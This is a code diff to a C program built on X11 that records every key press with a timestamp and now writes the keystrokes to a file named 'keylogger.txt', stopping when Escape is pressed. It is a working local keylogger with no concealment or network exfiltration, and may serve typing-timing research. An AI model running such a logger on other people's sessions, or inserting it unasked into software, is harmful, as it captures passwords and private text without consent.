@@ -4,6 +4,8 @@
 #include <X11/Xutil.h>
 #include <stdlib.h>
 #include <stdio.h>
+#include <unistd.h>
+#include <string.h>
 #include <sys/time.h>
 
 const char *detailToKey[] = {
@@ -214,8 +216,10 @@ int main() {
     KeySym *keysym;
     char * result;
     char lookupStr[256];
-    //struct timespec ts;
+    FILE *logFile;
     struct timeval tv;
+
+    logFile = fopen("keylogger.txt", "w");
 
     while (1) {
         cookie = (XGenericEventCookie*)&ev.xcookie;
@@ -244,17 +248,23 @@ int main() {
                     keysym = XGetKeyboardMapping (display, keycode, 1, &keysyms_per_keycode);
                     result = XKeysymToString (keysym[0]);
                     gettimeofday(&tv, NULL);
-                    printf("%s, %d, %d\n", result, tv.tv_sec, tv.tv_usec);
-                    
+                    fprintf(logFile, "%s, %ld, %ld\n", result, tv.tv_sec, tv.tv_usec);
+                    fflush(logFile);
+                    if (strcmp(result, "Escape") == 0) {
+                        fclose(logFile);
+                        XFreeEventData(display, cookie);
+                        goto Exit;
+                    }
                     //XLookupString((XKeyEvent *)&ev, lookupStr, 256, &ks, NULL);
                     //printf("%d\n", ks);
                     break;
              }
 
         }
-
+        
         XFreeEventData(display, cookie);
     }
+    Exit:
     XDestroyWindow(display, win);
 
     return 0;
